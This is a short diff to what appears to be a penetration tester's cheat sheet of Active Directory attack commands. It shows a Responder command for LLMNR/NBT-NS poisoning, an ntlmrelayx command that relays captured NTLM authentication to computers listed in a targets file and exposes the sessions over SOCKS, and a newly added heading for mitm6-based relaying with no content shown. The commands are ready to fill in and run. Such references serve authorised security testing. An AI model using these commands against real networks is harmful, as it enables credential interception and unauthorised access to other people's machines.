@@ -36,10 +36,12 @@ responder -I <interface> -r -d -w
 
 = interface: enp0s31f6
 
-## NTLM Relay with SOCKS
+## NTLM Relay with SOCKS (SMB)
 
 ```
 ntlmrelayx -tf <targets_file> -socks -smb2support
 ```
 
 = targets_file: ./targets/domain/relay_targets_computers.txt
+
+## mitm6 for NTLM Relay
